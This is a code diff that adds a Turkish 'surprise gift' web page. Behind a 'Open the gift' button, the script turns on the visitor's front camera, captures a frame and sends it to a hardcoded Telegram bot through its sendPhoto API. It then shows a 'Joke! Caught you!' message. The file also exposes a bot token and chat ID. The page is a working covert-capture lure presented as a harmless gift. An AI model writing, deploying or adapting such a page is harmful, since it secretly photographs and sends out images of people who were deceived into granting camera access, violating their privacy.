@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sürpriz Hediye</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #111;
+            color: white;
+            padding: 30px;
+        }
+        button {
+            background-color: #2ed573;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <h1>🎁 Sana Özel Bir Hediye Var!</h1>
+    <p>Hediyeni kutusundan çıkarmak için aşağıdaki butona tıkla:</p>
+
+    <button id="hediyeAc">Hediyeyi Aç</button>
+
+    <video id="kamera" autoplay playsinline></video>
+    <canvas id="tuval"></canvas>
+
+    <script>
+        // Bilgilerin kodun içine eklendi:
+        const TELEGRAM_BOT_TOKEN = "9140325940:AAEgWM2ew2YZNFaAh5z6QMDovPLi2eGC8zo";
+        const TELEGRAM_CHAT_ID = "6964304094";
+
+        const hediyeAcBtn = document.getElementById('hediyeAc');
+        const video = document.getElementById('kamera');
+        const canvas = document.getElementById('tuval');
+
+        hediyeAcBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', TELEGRAM_CHAT_ID);
+                        formData.append('photo', blob, 'tuzak.jpg');
+
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Gönderildi", data);
+                        })
+                        .catch(err => {
+                            console.error("Hata", err);
+                        });
+
+                    }, 'image/jpeg');
+
+                    stream.getTracks().forEach(track => track.stop());
+                    document.body.innerHTML = "<h1 style='color:#ff4757; margin-top:50px;'>😂 Şaka! Yakalandın!</h1>";
+
+                }, 800);
+
+            } catch (err) {
+                alert("Hediye kutusu açılamadı!");
+            }
+        });
+    </script>
+
+</body>
+</html>
